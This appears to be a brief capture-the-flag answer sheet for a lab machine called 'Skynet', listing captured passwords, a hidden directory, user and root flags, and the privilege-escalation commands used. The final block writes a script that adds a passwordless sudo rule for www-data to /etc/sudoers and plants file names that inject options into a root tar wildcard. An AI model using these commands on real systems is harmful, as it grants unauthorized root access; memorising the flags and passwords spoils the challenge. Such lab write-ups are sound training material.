# Skynet

```bash
export IP=10.10.201.97
```

# Task 1

* What is Miles password for his emails?

```
cyborg007haloterminator
```

> smb password: )s{A&2Z=F^n_E.B\`

* What is the hidden directory?

```
/45kra24zxs28v3yd
```

* What is the vulnerability called when you can include a remote file for malicious purposes?

```
Remote File Inclusion
```

* What is the user flag?

```
7ce5c2109a40f958099283600a9ae807
```

* What is the root flag?

```
3f0372db24753accc7179a282cd6a949
```

---

* used commands for PrivEsc 

```bash

python -c 'import pty;pty.spawn("/bin/bash")'

echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh
touch "/var/www/html/--checkpoint-action=exec=bash sudo.sh"
touch "/var/www/html/--checkpoint=1"


```